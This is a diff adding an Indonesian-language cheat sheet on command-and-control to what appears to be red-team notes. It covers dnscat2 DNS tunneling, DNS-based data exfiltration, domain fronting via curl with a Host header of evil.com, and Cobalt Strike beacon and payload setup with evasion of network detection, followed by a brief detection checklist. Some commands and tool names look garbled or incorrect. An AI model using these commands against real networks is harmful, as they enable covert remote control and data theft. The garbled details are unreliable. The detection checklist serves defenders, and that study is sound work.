@@ -113,3 +113,78 @@ Bypass: CDN blocking (2024+) → alternative: custom redirector chain
 - dnscat2 — https://github.com/iagox86/dnscat2
 - RITA (beaconing detect) — https://github.com/activecm/rita
 - Malleable C2 — https://www.cobaltstrike.com/help-malleable-c2
+
+## Konkret — C2/DNS Payload (Testable)
+
+### DNS Tunneling (dnscat2)
+
+```bash
+# Attacker: jalankan dnscat2 server
+ruby dnscat2.rb --dns port=53,domain=evil.com
+# Target: dnscat2 client
+dnscat2 --dns server=evil.com,port=53 evil.com
+
+# Data eksfil via DNS query TXT record
+# Setiap query: <data>.evil.com → server decode base64
+
+# Deteksi Band: traffic DNS sangat besar (normal <1MB/hari)
+# Tools deteksi: Yates, DNSicient
+```
+
+### Domain Fronting (CDN Abuse)
+
+```bash
+# Domain fronting: TLS SNI = domain legitimate
+# HTTP Host header = domain attacker (ALSANYA sebagai SNI)
+# CDN (CloudFront/Fastly) route berdasarkan Host header
+
+# Contoh:
+curl https://legit.cloudflare.com -H "Host: evil.com"
+# CDN terdepan SNI legit → route internal ke evil.com
+
+# Cobalt Strike C2 config:
+# set HostName "evil.com"
+# set HostHeader "legit.cloudflare.com"
+# Hasil: traffic terlihat legit, evades NIDS
+```
+
+### Cobalt Strike Beacon (HTTP/S)
+
+```bash
+# 1. Start teamserver
+teamserver C2_IP password
+
+# 2. Create beacon (HTTP/S)
+beacon http https://evil.com
+# Malleable C2 profile → customisasi HTTP pattern
+
+# 3. Generate payload
+Attacks > Packages > Windows Executable (Stageless)
+# Output: shellcode.bin / beacon.exe
+
+# 4. Malleable C2 profile (WAF evasion)
+# Mimic legitimate traffic (jQuery, Amazon API, dll.)
+```
+
+### DNS Beacon (Cobalt Strike)
+
+```bash
+# Configure DNS beacon
+beacon dns 53 evil.com
+# Beacon type: A record (data via A query), TXT, AAAA
+
+# Data exfil via subdomain:
+# <base64-data>.A.evil.com → server decode
+```
+
+### Detection Checklist
+
+1. DNS query volume: spike ke 1 domain = tunnel
+2. DNS query length: >100 char = base64 data
+3. TXT record count biasanya 0 — jika banyak, ada tunneling
+4. Jitter: beacon interval statis = C2, human = random
+5. TLS SNI vs Host header mismatch = domain fronting
+---
+
+audited
+---
